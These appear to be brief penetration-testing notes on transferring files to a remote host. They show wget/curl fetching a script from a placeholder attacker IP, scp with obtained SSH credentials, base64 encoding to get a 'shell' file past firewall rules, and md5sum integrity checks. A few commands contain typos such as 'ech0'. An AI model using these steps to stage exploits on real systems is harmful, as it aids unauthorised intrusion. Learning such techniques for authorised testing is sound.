I- Transferring file
  Goal: transferring file from a remote server such as enumeration scripts or exploits, or data

  a- Using wget
      - With a Python HTTP server on our machine and wget or curl

Step 1: on our machine => python3 -m http.server <PORT>
Step 2: on remote host => wget http://OUR_IP:PORT/lineum.sh
        or              => curl http://OUR_IP:PORT/lineum.sh -o lineum.sh   (the -o specify output file)



  b- Using SCP (secure copy)
In the scenario we got SSH credentials, we could use:
scp lineum.sh user@remotehost:/lineum.sh


  c- Using base64
In case we are not able to download/upload file because of firewall rule

Step 1 : base64 <filename> -w 0 => output the base64 value of the content of the file
Step 2 (on the other device): ech0 <base64_decoded_value> | base64 -d > shell


  d- Validating format of a file

To see the format of a file we can use: 
  => file <filename>

Then we can compare the integrity of the file that nothing has been changed with
  => md5sum <filename>

on both host






